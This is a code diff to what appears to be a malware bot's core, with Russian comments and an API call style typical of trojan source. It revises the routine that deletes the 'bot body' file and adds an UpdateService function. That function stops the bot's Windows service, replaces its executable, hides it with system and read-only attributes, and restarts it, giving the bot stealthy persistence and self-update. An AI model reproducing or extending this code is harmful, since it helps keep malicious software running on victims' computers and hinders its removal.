@@ -429,24 +429,27 @@ namespace BOT
     }
 
 	//удаляет тело (файл) бота
-	void DeleteBotFile( const char* FileName, DWORD TimeOut, bool DeleteAfterReboot )
+	bool DeleteBotFile( const char* FileName, DWORD TimeOut, bool DeleteAfterReboot )
 	{
 		// Удаляем файл
 		pSetFileAttributesA(FileName, FILE_ATTRIBUTE_NORMAL );
 		DWORD Start = (DWORD)pGetTickCount();
-		BOOL Deleted;
+		BOOL Deleted = FALSE;
 		do
 		{
 			Deleted = (BOOL)pDeleteFileA(FileName);
-			if ((TimeOut && (DWORD)pGetTickCount() - Start <= TimeOut))
+			if (!Deleted && TimeOut)
 			{
 				// В случае если указан таймаут то приостанавливаем выполнение
 				// и пытаемся ещё раз удалить
-				pSleep(250);
-				continue;
+				DWORD Interval = (DWORD)pGetTickCount() - Start;
+				if (Interval <= TimeOut)
+					pSleep(250);
+				else
+					break;
 			}
 		}
-		while (false);
+		while (!Deleted && TimeOut);
 
 
 		if (!Deleted && DeleteAfterReboot)
@@ -454,7 +457,9 @@ namespace BOT
 			// Не удалось на прямую удалить файл.
 			// Удаляем файл после перезагрузки
 			Deleted = (BOOL)pMoveFileExA(FileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
-        }
+		}
+
+		return Deleted;
 	}
     //----------------------------------------------------------------------
 
@@ -850,6 +855,44 @@ bool BOT::InstallService(const char* FileName)
 }
 
 //----------------------------------------------------
+// UpdateService - Функция обновляет ехе сервиса
+//----------------------------------------------------
+bool BOT::UpdateService(const char* FileName)
+{
+	if (!File::IsExists((PCHAR)FileName))
+		return false;
+		
+	string FN = GetServiceFullExeName();
+	if (FN.IsEmpty()) 
+		return false;
+		
+	COREDBG("BotCore", "Обновляем ехе сервиса %s", FN.t_str());
+	TService Service;
+	Service.Name = GetStr(EStrServiceName);
+	
+	// Останавливаем сервис
+	BOOL Result = Service.Stop(30000);
+	COREDBG("BotCore", "Останавливаем сервис. Результат=%d [Err:%d]", Result, pGetLastError());
+
+	// Заменяем файл
+	Result = DeleteBotFile(FN.t_str(), 30000, false);
+	COREDBG("BotCore", "Удаляем файл сервиса. Результат=%d [Err:%d]", Result, pGetLastError());
+	
+	Result = (BOOL)pCopyFileA(FileName, FN.t_str(), FALSE);
+    COREDBG("BotCore", "Заменяем файл сервиса. Результат=%d [Err:%d]", Result, pGetLastError());
+	
+	pSetFileAttributesA(FN.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
+
+	// Запускаем сервис
+	Service.Close();
+	Result = Service.Start();
+	COREDBG("BotCore", "Стартуем сервис. Результат=%d [Err:%d]", Result, pGetLastError());
+	
+	return Result != 0;
+}
+
+
+//----------------------------------------------------
 // UninstallService - Функция деинсталирует
 //                    сервис бота
 //----------------------------------------------------
@@ -866,10 +909,13 @@ bool BOT::UninstallService()
 		// Удалем файл
 		string ExeName = GetServiceFullExeName();
 		COREDBG("BotCore", "Сервис деинсталирован. Удаляем ехе %s", ExeName.t_str());
-		DeleteBotFile(ExeName.t_str(), 30000, false);
+		Result = DeleteBotFile(ExeName.t_str(), 30000, false);
+
 	}
+	if (Result)
+		COREDBG("BotCore", "Сервис успешно деинсталирован");
 	else
-    	COREDBG("BotCore", "Ошибка деинсталяции сервиса. Ошибка %d", pGetLastError());
+		COREDBG("BotCore", "Ошибка деинсталяции сервиса. Ошибка %d", pGetLastError());
 
 	return Result;
 }
@@ -1111,10 +1157,7 @@ bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
 	if (ResetSettings)
 		DeleteSettings();
 
-	// Деинсталируем сервис
-	UninstallService();
-
-    // Удаляем текущую версию бота
+	// Удаляем текущую версию бота
 	if (FileExistsA(BotFile.t_str()))
 	{
 		COREDBG("MakeUpdate", "Удаляем старый файл");
@@ -1130,7 +1173,7 @@ bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
 	}
 
     // инсталируем сервис
-	InstallService(FileName);
+	UpdateService(FileName);
 
 	// Перемещаем файл
 	bool Result = pMoveFileExA(FileName, BotFile.t_str(), MOVEFILE_REPLACE_EXISTING ) != 0;
